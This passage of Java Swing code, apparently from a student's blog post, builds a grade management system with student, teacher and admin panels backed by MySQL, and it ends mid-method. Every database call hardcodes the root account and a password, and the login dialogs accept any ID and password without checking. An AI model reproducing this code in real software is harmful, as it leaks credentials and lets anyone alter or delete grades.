JPanel panel = new JPanel();</span><br><span class="line">        // 添加面板</span><br><span class="line">        frame.add(panel);</span><br><span class="line">        /*</span><br><span class="line">         * 调用用户定义的方法并添加组件到面板</span><br><span class="line">         */</span><br><span class="line">        placeComponents(panel);</span><br><span class="line"></span><br><span class="line">        // 设置界面可见</span><br><span class="line">        frame.setVisible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void placeComponents(JPanel panel) &#123;</span><br><span class="line"></span><br><span class="line">        /* 布局部分我们这边不多做介绍</span><br><span class="line">         * 这边设置布局为 null</span><br><span class="line">         */</span><br><span class="line">        panel.setLayout(null);</span><br><span class="line"></span><br><span class="line">        // 创建 JLabel</span><br><span class="line">        JLabel userLabel = new JLabel(&quot;User:&quot;);</span><br><span class="line">        /* 这个方法定义了组件的位置。</span><br><span class="line">         * setBounds(x, y, width, height)</span><br><span class="line">         * x 和 y 指定左上角的新位置，由 width 和 height 指定新的大小。</span><br><span class="line">         */</span><br><span class="line">        userLabel.setBounds(10,20,80,25);</span><br><span class="line">        panel.add(userLabel);</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">         * 创建文本域用于用户输入</span><br><span class="line">         */</span><br><span class="line">        JTextField userText = new JTextField(20);</span><br><span class="line">        userText.setBounds(100,20,165,25);</span><br><span class="line">        panel.add(userText);</span><br><span class="line"></span><br><span class="line">        // 输入密码的文本域</span><br><span class="line">        JLabel passwordLabel = new JLabel(&quot;Password:&quot;);</span><br><span class="line">        passwordLabel.setBounds(10,50,80,25);</span><br><span class="line">        panel.add(passwordLabel);</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">         *这个类似用于输入的文本域</span><br><span class="line">         * 但是输入的信息会以点号代替，用于包含密码的安全性</span><br><span class="line">         */</span><br><span class="line">        JPasswordField passwordText = new JPasswordField(20);</span><br><span class="line">        passwordText.setBounds(100,50,165,25);</span><br><span class="line">        panel.add(passwordText);</span><br><span class="line"></span><br><span class="line">        // 创建登录按钮</span><br><span class="line">        JButton loginButton = new JButton(&quot;login&quot;);</span><br><span class="line">        loginButton.setBounds(10, 80, 80, 25);</span><br><span class="line">        panel.add(loginButton);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class StudentGradeManagementSystem &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SwingUtilities.invokeLater(() -&gt; &#123;</span><br><span class="line">            JFrame frame = new JFrame(&quot;学生成绩管理系统&quot;);</span><br><span class="line">            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">            frame.setSize(1000, 800);</span><br><span class="line">            frame.add(new MainPanel());</span><br><span class="line">            frame.setLocationRelativeTo(null);</span><br><span class="line">            frame.setVisible(true);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主面板</span><br><span class="line">class MainPanel extends JPanel &#123;</span><br><span class="line">    public MainPanel() &#123;</span><br><span class="line">        ImageIcon originalIcon = new ImageIcon(&quot;C:\\Users\\ASUS\\Desktop\\微信图片_20241031205640.jpg&quot;);</span><br><span class="line">        Image scaledImage = originalIcon.getImage().getScaledInstance(980, 800, Image.SCALE_SMOOTH); // 根据需要调整大小</span><br><span class="line">        JLabel background = new JLabel(new ImageIcon(scaledImage));</span><br><span class="line">        background.setLayout(new BorderLayout());</span><br><span class="line"></span><br><span class="line">        JButton btnStudentLogin = new JButton(&quot;学生登录&quot;);</span><br><span class="line">        JButton btnTeacherLogin = new JButton(&quot;教师登录&quot;);</span><br><span class="line">        JButton btnAdminLogin = new JButton(&quot;管理员登录&quot;);</span><br><span class="line"></span><br><span class="line">        btnStudentLogin.addActionListener(e -&gt; studentLogin());</span><br><span class="line">        btnTeacherLogin.addActionListener(e -&gt; teacherLogin());</span><br><span class="line">        btnAdminLogin.addActionListener(e -&gt; adminLogin());</span><br><span class="line"></span><br><span class="line">        add(btnStudentLogin);</span><br><span class="line">        add(btnTeacherLogin);</span><br><span class="line">        add(btnAdminLogin);</span><br><span class="line">        add(background, BorderLayout.CENTER);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void studentLogin() &#123;</span><br><span class="line">        login(&quot;学生&quot;, this::showStudentFeatures);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void teacherLogin() &#123;</span><br><span class="line">        login(&quot;教师&quot;, this::showTeacherFeatures);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void adminLogin() &#123;</span><br><span class="line">        login(&quot;管理员&quot;, this::showAdminFeatures);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void login(String role, LoginCallback callback) &#123;</span><br><span class="line">        JTextField idField = new JTextField(15);</span><br><span class="line">        JPasswordField passwordField = new JPasswordField(15);</span><br><span class="line">        JPanel loginPanel = new JPanel(new GridLayout(0, 1));</span><br><span class="line">        loginPanel.add(new JLabel(&quot;ID:&quot;));</span><br><span class="line">        loginPanel.add(idField);</span><br><span class="line">        loginPanel.add(new JLabel(&quot;密码:&quot;));</span><br><span class="line">        loginPanel.add(passwordField);</span><br><span class="line"></span><br><span class="line">        int option = JOptionPane.showConfirmDialog(this, loginPanel, role + &quot;登录&quot;, JOptionPane.OK_CANCEL_OPTION);</span><br><span class="line">        if (option == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">            String id = idField.getText();</span><br><span class="line">            String password = new String(passwordField.getPassword());</span><br><span class="line">            callback.showFeatures(id, password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void showStudentFeatures(String studentId, String password) &#123;</span><br><span class="line">        // 此处可以添加学生验证逻辑</span><br><span class="line">        JFrame studentFrame = new JFrame(&quot;学生功能&quot;);</span><br><span class="line">        studentFrame.setSize(500, 400);</span><br><span class="line">        studentFrame.add(new StudentPanel(studentId)); // 传递学生ID</span><br><span class="line">        studentFrame.setLocationRelativeTo(null);</span><br><span class="line">        studentFrame.setVisible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void showTeacherFeatures(String teacherId, String password) &#123;</span><br><span class="line">        // 此处可以添加教师验证逻辑</span><br><span class="line">        JFrame teacherFrame = new JFrame(&quot;教师功能&quot;);</span><br><span class="line">        teacherFrame.setSize(600, 400);</span><br><span class="line">        teacherFrame.add(new TeacherPanel());</span><br><span class="line">        teacherFrame.setLocationRelativeTo(null);</span><br><span class="line">        teacherFrame.setVisible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void showAdminFeatures(String adminId, String password) &#123;</span><br><span class="line">        // 此处可以添加管理员验证逻辑</span><br><span class="line">        JFrame adminFrame = new JFrame(&quot;管理员功能&quot;);</span><br><span class="line">        adminFrame.setSize(600, 400);</span><br><span class="line">        adminFrame.add(new AdminPanel());</span><br><span class="line">        adminFrame.setLocationRelativeTo(null);</span><br><span class="line">        adminFrame.setVisible(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    interface LoginCallback &#123;</span><br><span class="line">        void showFeatures(String id, String password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// 学生功能面板</span><br><span class="line">class StudentPanel extends JPanel &#123;</span><br><span class="line">    private String studentId;</span><br><span class="line"></span><br><span class="line">    public StudentPanel(String studentId) &#123;</span><br><span class="line">        this.studentId = studentId;</span><br><span class="line">        setLayout(new BorderLayout());  // 使用 BorderLayout 布局</span><br><span class="line"></span><br><span class="line">        // 1. 学生信息区顶部标题</span><br><span class="line">        JPanel topPanel = new JPanel();</span><br><span class="line">        JLabel titleLabel = new JLabel(&quot;学生管理功能面板&quot;, JLabel.CENTER);</span><br><span class="line">        titleLabel.setFont(new Font(&quot;Serif&quot;, Font.BOLD, 20));</span><br><span class="line">        topPanel.add(titleLabel);</span><br><span class="line">        add(topPanel, BorderLayout.NORTH);</span><br><span class="line"></span><br><span class="line">        // 2. 添加学生头像或其他图片</span><br><span class="line">        ImageIcon studentImageIcon = new ImageIcon(&quot;C:\\Users\\ASUS\\Desktop\\微信图片_20241031111338.jpg&quot;);</span><br><span class="line">        Image studentImage = studentImageIcon.getImage().getScaledInstance(100, 100, Image.SCALE_SMOOTH);</span><br><span class="line">        JLabel studentImageLabel = new JLabel(new ImageIcon(studentImage));</span><br><span class="line">        JPanel imagePanel = new JPanel();  // 创建一个单独的面板来显示图片</span><br><span class="line">        imagePanel.add(studentImageLabel);</span><br><span class="line">        imagePanel.setBorder(BorderFactory.createLineBorder(Color.BLACK));  // 添加边框</span><br><span class="line"></span><br><span class="line">        // 3. 功能按钮面板</span><br><span class="line">        JPanel buttonPanel = new JPanel(new GridLayout(3, 1, 10, 10));  // 3行1列的布局</span><br><span class="line">        JButton btnViewGrades = createStyledButton(&quot;查询成绩&quot;);</span><br><span class="line">        JButton btnViewProfile = createStyledButton(&quot;查看个人资料&quot;);</span><br><span class="line">        JButton btnViewCourses = createStyledButton(&quot;查看课程信息&quot;);</span><br><span class="line"></span><br><span class="line">        // 按钮事件绑定</span><br><span class="line">        btnViewGrades.addActionListener(e -&gt; queryGrades());</span><br><span class="line">        btnViewProfile.addActionListener(e -&gt; viewProfile());</span><br><span class="line">        btnViewCourses.addActionListener(e -&gt; viewCourses());</span><br><span class="line"></span><br><span class="line">        // 添加按钮到按钮面板</span><br><span class="line">        buttonPanel.add(btnViewGrades);</span><br><span class="line">        buttonPanel.add(btnViewProfile);</span><br><span class="line">        buttonPanel.add(btnViewCourses);</span><br><span class="line"></span><br><span class="line">        // 4. 底部版权信息</span><br><span class="line">        JPanel bottomPanel = new JPanel();</span><br><span class="line">        bottomPanel.setBackground(new Color(72, 61, 139));</span><br><span class="line">        JLabel bottomLabel = new JLabel(&quot;版权所有 © 2024 学生管理系统&quot;);</span><br><span class="line">        bottomLabel.setForeground(Color.WHITE);</span><br><span class="line">        bottomPanel.add(bottomLabel);</span><br><span class="line"></span><br><span class="line">        // 将图片面板、按钮面板和版权信息加入到主面板</span><br><span class="line">        add(imagePanel, BorderLayout.WEST);  // 把图片放在左侧</span><br><span class="line">        add(buttonPanel, BorderLayout.CENTER);  // 把按钮放在中间</span><br><span class="line">        add(bottomPanel, BorderLayout.SOUTH);  // 把版权信息放在底部</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private JButton createStyledButton(String text) &#123;</span><br><span class="line">        JButton button = new JButton(text);</span><br><span class="line">        button.setFont(new Font(&quot;Serif&quot;, Font.PLAIN, 18));  // 使用Serif字体，字号18</span><br><span class="line">        button.setFocusPainted(false);  // 不显示按钮的焦点框</span><br><span class="line">        button.setPreferredSize(new Dimension(200, 60)); // 设置按钮的大小</span><br><span class="line">        button.setForeground(Color.BLACK);  // 文字颜色为黑色</span><br><span class="line">        button.setBackground(Color.WHITE);  // 背景为白色</span><br><span class="line">        button.setBorder(BorderFactory.createLineBorder(Color.BLACK));  // 边框颜色为黑色</span><br><span class="line">        return button;</span><br><span class="line">    &#125;</span><br><span class="line">    // 查询成绩的方法</span><br><span class="line">    private void queryGrades() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                    &quot;root&quot;,</span><br><span class="line">                    &quot;1405269390a&quot;);</span><br><span class="line">                 PreparedStatement stmt = conn.prepareStatement(&quot;SELECT * FROM studentgrade WHERE stuid2 = ?&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                stmt.setString(1, studentId);</span><br><span class="line">                ResultSet rs = stmt.executeQuery();</span><br><span class="line">                StringBuilder grades = new StringBuilder(&quot;成绩查询:\n&quot;);</span><br><span class="line"></span><br><span class="line">                while (rs.next()) &#123;</span><br><span class="line">                    grades.append(rs.getString(&quot;name&quot;)).append(&quot;\n&quot;)</span><br><span class="line">                            .append(&quot;高数：&quot;).append(rs.getInt(&quot;math&quot;)).append(&quot;，&quot;)</span><br><span class="line">                            .append(&quot;马原：&quot;).append(rs.getInt(&quot;MaYuan&quot;)).append(&quot;；&quot;)</span><br><span class="line">                            .append(&quot;英语：&quot;).append(rs.getInt(&quot;English&quot;)).append(&quot;，&quot;)</span><br><span class="line">                            .append(&quot;线性代数：&quot;).append(rs.getInt(&quot;linemath&quot;)).append(&quot;\n&quot;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                JOptionPane.showMessageDialog(this, grades.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;JDBC 驱动未找到: &quot; + e.getMessage());</span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void viewProfile() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 加载数据库驱动</span><br><span class="line">            Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line"></span><br><span class="line">            // 建立连接（根据实际情况修改数据库连接信息）</span><br><span class="line">            try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                    &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;, // 数据库连接</span><br><span class="line">                    &quot;root&quot;,    // 用户名</span><br><span class="line">                    &quot;1405269390a&quot;)) &#123;  // 密码</span><br><span class="line"></span><br><span class="line">                // SQL 查询：根据 studentId 查询该学生的个人信息</span><br><span class="line">                String query = &quot;SELECT stuid1, name, telenumber, qqmail, classnumber FROM student WHERE stuid1 = ?&quot;;</span><br><span class="line">                try (PreparedStatement stmt = conn.prepareStatement(query)) &#123;</span><br><span class="line">                    stmt.setString(1, studentId);  // 设置查询条件为学生ID</span><br><span class="line"></span><br><span class="line">                    // 执行查询并获取结果</span><br><span class="line">                    ResultSet rs = stmt.executeQuery();</span><br><span class="line"></span><br><span class="line">                    if (rs.next()) &#123;</span><br><span class="line">                        // 获取查询结果</span><br><span class="line">                        String stuid = rs.getString(&quot;stuid1&quot;);</span><br><span class="line">                        String name = rs.getString(&quot;name&quot;);</span><br><span class="line">                        String telenumber = rs.getString(&quot;telenumber&quot;);</span><br><span class="line">                        String qqmail = rs.getString(&quot;qqmail&quot;);</span><br><span class="line">                        String classnumber = rs.getString(&quot;classnumber&quot;);</span><br><span class="line"></span><br><span class="line">                        // 构建学生个人资料字符串</span><br><span class="line">                        String studentProfile = &quot;学生姓名: &quot; + name + &quot;\n&quot; +</span><br><span class="line">                                &quot;学号: &quot; + stuid + &quot;\n&quot; +</span><br><span class="line">                                &quot;电话: &quot; + telenumber + &quot;\n&quot; +</span><br><span class="line">                                &quot;QQ邮箱: &quot; + qqmail + &quot;\n&quot; +</span><br><span class="line">                                &quot;班级号: &quot; + classnumber;</span><br><span class="line"></span><br><span class="line">                        // 显示学生资料</span><br><span class="line">                        JOptionPane.showMessageDialog(this, studentProfile, &quot;个人资料&quot;, JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        // 如果未找到该学生的信息</span><br><span class="line">                        JOptionPane.showMessageDialog(this, &quot;未找到该学生的个人信息。&quot;, &quot;错误&quot;, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;JDBC 驱动未找到: &quot; + e.getMessage(), &quot;错误&quot;, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">        &#125; catch (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage(), &quot;错误&quot;, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 查看课程信息</span><br><span class="line">    private void viewCourses() &#123;</span><br><span class="line">        // 这里可以添加逻辑查询学生的课程信息</span><br><span class="line">        String courses = &quot;已选课程:\n1. 高等数学\n2. 线性代数\n3. 英语\n4. 马原&quot;;</span><br><span class="line">        JOptionPane.showMessageDialog(this, courses, &quot;课程信息&quot;, JOptionPane.INFORMATION_MESSAGE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TeacherPanel extends JPanel &#123;</span><br><span class="line"></span><br><span class="line">    public TeacherPanel() &#123;</span><br><span class="line">        setLayout(new BorderLayout());</span><br><span class="line"></span><br><span class="line">        // 1. 教师功能区顶部标题</span><br><span class="line">        JPanel topPanel = new JPanel();</span><br><span class="line">        JLabel titleLabel = new JLabel(&quot;教师管理功能界面&quot;, JLabel.CENTER);</span><br><span class="line">        titleLabel.setFont(new Font(&quot;Serif&quot;, Font.BOLD, 20));</span><br><span class="line">        topPanel.add(titleLabel);</span><br><span class="line">        add(topPanel, BorderLayout.NORTH);</span><br><span class="line"></span><br><span class="line">        // 2. 创建功能按钮面板</span><br><span class="line">        JPanel buttonPanel = new JPanel(new GridLayout(3, 2, 20, 20));  // 按钮布局：3行2列</span><br><span class="line"></span><br><span class="line">        JButton btnEnterGrades = createStyledButton(&quot;录入成绩&quot;);</span><br><span class="line">        JButton btnModifyGrades = createStyledButton(&quot;修改成绩&quot;);</span><br><span class="line">        JButton btnAnalyzeGrades = createStyledButton(&quot;成绩统计分析&quot;);</span><br><span class="line">        JButton btnViewGrades = createStyledButton(&quot;查看成绩&quot;);</span><br><span class="line">        JButton btnDeleteGrades = createStyledButton(&quot;删除成绩&quot;);</span><br><span class="line">        JButton btnExportGrades = createStyledButton(&quot;导出成绩&quot;);</span><br><span class="line"></span><br><span class="line">        // 按钮事件绑定</span><br><span class="line">        btnEnterGrades.addActionListener(e -&gt; enterGrades());</span><br><span class="line">        btnModifyGrades.addActionListener(e -&gt; modifyGrades());</span><br><span class="line">        btnAnalyzeGrades.addActionListener(e -&gt; analyzeGrades());</span><br><span class="line">        btnViewGrades.addActionListener(e -&gt; viewGrades());</span><br><span class="line">        btnDeleteGrades.addActionListener(e -&gt; deleteGrades());</span><br><span class="line">        btnExportGrades.addActionListener(e -&gt; exportGrades());</span><br><span class="line"></span><br><span class="line">        buttonPanel.add(btnEnterGrades);</span><br><span class="line">        buttonPanel.add(btnModifyGrades);</span><br><span class="line">        buttonPanel.add(btnAnalyzeGrades);</span><br><span class="line">        buttonPanel.add(btnViewGrades);</span><br><span class="line">        buttonPanel.add(btnDeleteGrades);</span><br><span class="line">        buttonPanel.add(btnExportGrades);</span><br><span class="line"></span><br><span class="line">        add(buttonPanel, BorderLayout.CENTER);</span><br><span class="line"></span><br><span class="line">        // 3. 底部版权信息</span><br><span class="line">        JPanel bottomPanel = new JPanel();</span><br><span class="line">        bottomPanel.setBackground(new Color(72, 61, 139));</span><br><span class="line">        JLabel bottomLabel = new JLabel(&quot;版权所有 © 2024 教师管理系统&quot;);</span><br><span class="line">        bottomLabel.setForeground(Color.WHITE);</span><br><span class="line">        bottomPanel.add(bottomLabel);</span><br><span class="line">        add(bottomPanel, BorderLayout.SOUTH);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private JButton createStyledButton(String text) &#123;</span><br><span class="line">        JButton button = new JButton(text);</span><br><span class="line">        button.setFont(new Font(&quot;Serif&quot;, Font.PLAIN, 18));  // 使用Serif字体，字号18</span><br><span class="line">        button.setFocusPainted(false);  // 不显示按钮的焦点框</span><br><span class="line">        button.setPreferredSize(new Dimension(200, 60)); // 设置按钮的大小</span><br><span class="line">        button.setForeground(Color.BLACK);  // 文字颜色为黑色</span><br><span class="line">        button.setBackground(Color.WHITE);  // 背景为白色</span><br><span class="line">        button.setBorder(BorderFactory.createLineBorder(Color.BLACK));  // 边框颜色为黑色</span><br><span class="line">        return button;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 录入成绩功能</span><br><span class="line">            private void enterGrades() &#123;</span><br><span class="line">                JTextField studentIdField = new JTextField(15);</span><br><span class="line">                JTextField mathField = new JTextField(15);</span><br><span class="line">                JTextField maYuanField = new JTextField(15);</span><br><span class="line">                JTextField englishField = new JTextField(15);</span><br><span class="line">                JTextField lineMathField = new JTextField(15);</span><br><span class="line"></span><br><span class="line">                JPanel panel = new JPanel(new GridLayout(0, 1));</span><br><span class="line">                panel.add(new JLabel(&quot;学生ID:&quot;));</span><br><span class="line">                panel.add(studentIdField);</span><br><span class="line">                panel.add(new JLabel(&quot;数学成绩:&quot;));</span><br><span class="line">                panel.add(mathField);</span><br><span class="line">                panel.add(new JLabel(&quot;MaYuan成绩:&quot;));</span><br><span class="line">                panel.add(maYuanField);</span><br><span class="line">                panel.add(new JLabel(&quot;英语成绩:&quot;));</span><br><span class="line">                panel.add(englishField);</span><br><span class="line">                panel.add(new JLabel(&quot;线性代数成绩:&quot;));</span><br><span class="line">                panel.add(lineMathField);</span><br><span class="line"></span><br><span class="line">                int option = JOptionPane.showConfirmDialog(this, panel, &quot;录入成绩&quot;, JOptionPane.OK_CANCEL_OPTION);</span><br><span class="line">                if (option == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">                    String studentId = studentIdField.getText();</span><br><span class="line">                    int mathScore = Integer.parseInt(mathField.getText());</span><br><span class="line">                    int maYuanScore = Integer.parseInt(maYuanField.getText());</span><br><span class="line">                    int englishScore = Integer.parseInt(englishField.getText());</span><br><span class="line">                    int lineMathScore = Integer.parseInt(lineMathField.getText());</span><br><span class="line"></span><br><span class="line">                    saveGrades(studentId, mathScore, maYuanScore, englishScore, lineMathScore);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 保存成绩到数据库</span><br><span class="line">            private void saveGrades(String studentId, int mathScore, int maYuanScore, int englishScore, int lineMathScore) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                    try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                            &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                            &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                         PreparedStatement stmt = conn.prepareStatement(&quot;INSERT INTO studentgrade (stuid2, math, MaYuan, English, linemath) VALUES (?, ?, ?, ?, ?)&quot;)) &#123;</span><br><span class="line">                        stmt.setString(1, studentId);</span><br><span class="line">                        stmt.setInt(2, mathScore);</span><br><span class="line">                        stmt.setInt(3, maYuanScore);</span><br><span class="line">                        stmt.setInt(4, englishScore);</span><br><span class="line">                        stmt.setInt(5, lineMathScore);</span><br><span class="line">                        stmt.executeUpdate();</span><br><span class="line">                        JOptionPane.showMessageDialog(this, &quot;成绩录入成功!&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 查看成绩</span><br><span class="line">            private void viewGrades() &#123;</span><br><span class="line">                String studentId = JOptionPane.showInputDialog(this, &quot;请输入学生ID:&quot;);</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                    try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                            &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                            &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                         PreparedStatement stmt = conn.prepareStatement(&quot;SELECT * FROM studentgrade WHERE stuid2 = ?&quot;)) &#123;</span><br><span class="line">                        stmt.setString(1, studentId);</span><br><span class="line">                        ResultSet rs = stmt.executeQuery();</span><br><span class="line">                        if (rs.next()) &#123;</span><br><span class="line">                            String result = String.format(&quot;学生ID: %s\n数学: %d\n马原: %d\n英语: %d\n线性代数: %d&quot;,</span><br><span class="line">                                    rs.getString(&quot;stuid2&quot;), rs.getInt(&quot;math&quot;), rs.getInt(&quot;MaYuan&quot;),</span><br><span class="line">                                    rs.getInt(&quot;English&quot;), rs.getInt(&quot;linemath&quot;));</span><br><span class="line">                            JOptionPane.showMessageDialog(this, result);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;未找到学生ID!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 修改成绩</span><br><span class="line">            private void modifyGrades() &#123;</span><br><span class="line">                String studentId = JOptionPane.showInputDialog(this, &quot;请输入学生ID:&quot;);</span><br><span class="line">                JTextField newMathField = new JTextField(15);</span><br><span class="line">                JTextField newMaYuanField = new JTextField(15);</span><br><span class="line">                JTextField newEnglishField = new JTextField(15);</span><br><span class="line">                JTextField newlineField = new JTextField(15);</span><br><span class="line"></span><br><span class="line">                JPanel panel = new JPanel(new GridLayout(0, 1));</span><br><span class="line">                panel.add(new JLabel(&quot;新数学成绩:&quot;));</span><br><span class="line">                panel.add(newMathField);</span><br><span class="line">                panel.add(new JLabel(&quot;新马原成绩:&quot;));</span><br><span class="line">                panel.add(newMaYuanField);</span><br><span class="line">                panel.add(new JLabel(&quot;新英语成绩:&quot;));</span><br><span class="line">                panel.add(newEnglishField);</span><br><span class="line">                panel.add(new JLabel(&quot;新线性代数成绩:&quot;));</span><br><span class="line">                panel.add(newlineField);</span><br><span class="line"></span><br><span class="line">                int option = JOptionPane.showConfirmDialog(this, panel, &quot;修改成绩&quot;, JOptionPane.OK_CANCEL_OPTION);</span><br><span class="line">                if (option == JOptionPane.OK_OPTION) &#123;</span><br><span class="line">                    int newMathScore = Integer.parseInt(newMathField.getText());</span><br><span class="line">                    int newMaYuanScore = Integer.parseInt(newMaYuanField.getText());</span><br><span class="line">                    updateGrades(studentId, newMathScore, newMaYuanScore);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 更新成绩</span><br><span class="line">            private void updateGrades(String studentId, int newMathScore, int newMaYuanScore) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                    try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                            &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                            &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                         PreparedStatement stmt = conn.prepareStatement(&quot;UPDATE studentgrade SET math = ?, MaYuan = ? WHERE stuid2 = ?&quot;)) &#123;</span><br><span class="line">                        stmt.setInt(1, newMathScore);</span><br><span class="line">                        stmt.setInt(2, newMaYuanScore);</span><br><span class="line">                        stmt.setString(3, studentId);</span><br><span class="line">                        int rowsUpdated = stmt.executeUpdate();</span><br><span class="line">                        if (rowsUpdated &gt; 0) &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;成绩修改成功!&quot;);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;未找到对应的学生ID!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException | SQLException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    JOptionPane.showMessageDialog(this, &quot;数据库错误: &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 删除成绩</span><br><span class="line">            private void deleteGrades() &#123;</span><br><span class="line">                String studentId = JOptionPane.showInputDialog(this, &quot;请输入学生ID:&quot;);</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;);</span><br><span class="line">                    try (Connection conn = DriverManager.getConnection(</span><br><span class="line">                            &quot;jdbc:mysql://localhost:3306/student?useSSL=false&amp;serverTimezone=UTC&quot;,</span><br><span class="line">                            &quot;root&quot;, &quot;1405269390a&quot;);</span><br><span class="line">                         PreparedStatement stmt = conn.prepareStatement(&quot;DELETE FROM studentgrade WHERE stuid2 = ?&quot;)) &#123;</span><br><span class="line">                        stmt.setString(1, studentId);</span><br><span class="line">                        int rowsDeleted = stmt.executeUpdate();</span><br><span class="line">                        if (rowsDeleted &gt; 0) &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;成绩删除成功!&quot;);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            JOptionPane.showMessageDialog(this, &quot;未找到对应的学生ID!&quot;);</span><br><span class="line">                        